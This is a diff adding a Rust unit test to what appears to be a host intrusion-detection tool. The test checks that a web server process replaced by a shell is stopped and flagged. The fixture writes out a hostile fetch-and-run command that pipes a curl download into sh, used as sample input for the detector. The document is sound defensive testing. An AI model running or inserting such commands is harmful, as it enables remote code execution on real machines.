@@ -74,6 +74,25 @@ fn look(watcher: &mut Watcher<Machine, Recorded>, now: f64, started: &[Snap]) ->
 }
 
 #[test]
+fn a_web_server_replaced_by_a_shell_is_stopped_and_recorded_as_the_shell() {
+    let server = Proc { pid: 100, ppid: 1, name: "php-fpm8.3".into(), path: "/home/site/php-fpm8.3".into(), started: 5 };
+    let machine = Machine { procs: vec![server.clone()], ..Machine::default() };
+    let mut watcher = Watcher::new(machine, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
+    let before = Snap { proc: server, cmdline: "php-fpm8.3 -c exec sh".into(), parent: "systemd".into(), jumped: false, handed: false };
+    assert!(look(&mut watcher, T, &[before]).is_empty());
+
+    let shell = Proc { pid: 100, ppid: 1, name: "dash".into(), path: "/usr/bin/dash".into(), started: 5 };
+    let snap = Snap { proc: shell.clone(), cmdline: "sh -c curl -fsS http://127.0.0.1:18999/p | sh".into(), parent: "php-fpm8.3".into(), jumped: false, handed: false };
+    watcher.sensor.procs = vec![shell];
+    watcher.on_exec(&snap, T + 1.0);
+    let cases = look(&mut watcher, T + 1.0, &[snap]);
+    assert_eq!(cases.len(), 1, "{cases:?}");
+    assert_eq!(cases[0]["name"], "dash");
+    assert_eq!(cases[0]["actions"][0]["action"], "stopped");
+    assert!(cases[0]["signals"].as_array().unwrap().iter().any(|signal| signal["id"] == "risky_command_line"));
+}
+
+#[test]
 fn a_burst_of_failed_ssh_sign_ins_is_one_case_an_hour_and_a_success_after_it_is_said_at_once() {
     let mut watcher = Watcher::new(Machine::default(), Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "");
     let burst = Burst { address: "93.184.216.34".into(), count: 31, accounts: 12, accepted: String::new() };
